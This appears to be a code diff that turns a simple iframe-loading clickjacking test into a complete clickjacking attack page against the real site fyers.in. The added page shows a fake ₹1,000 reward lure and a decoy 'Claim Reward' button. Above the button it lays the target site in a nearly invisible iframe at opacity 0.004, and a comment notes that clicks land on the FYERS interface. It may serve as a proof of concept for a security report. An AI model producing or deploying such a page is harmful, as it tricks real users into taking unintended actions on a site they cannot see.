@@ -1,24 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Clickjacking Test</title>
+  <title>You won a reward!</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-    }
+    body { background: #0f172a; color: white; text-align: center; font-family: Arial; }
+    .container { position: relative; width: 100%; height: 800px; margin-top: 20px; }
     iframe {
-      width: 100%;
-      height: 600px;
-      border: 2px solid red;
+      position: absolute; top: 0; left: 0;
+      width: 100%; height: 100%;
+      opacity: 0.004;   /* effectively invisible to victim */
+      z-index: 2;
+      border: none;
+      pointer-events: auto;
+    }
+    .decoy {
+      position: absolute; top: 300px;
+      width: 100%; z-index: 1;
+      text-align: center;
+    }
+    button {
+      padding: 16px 36px; font-size: 18px;
+      background: #22c55e; color: #000;
+      border: none; border-radius: 8px; cursor: pointer;
     }
   </style>
 </head>
 <body>
-
-<h2>Clickjacking Test – iframe load check</h2>
-
-<iframe src="https://fyers.in/"></iframe>
-
+  <h2>🎉 Congratulations! You have been selected.</h2>
+  <p>Click below to claim your ₹1,000 reward.</p>
+  <div class="container">
+    <div class="decoy">
+      <button>Claim Reward</button>
+    </div>
+    <!-- fyers.in loads invisibly on top — user clicks land on FYERS UI -->
+    <iframe src="https://fyers.in/"></iframe>
+  </div>
 </body>
 </html>
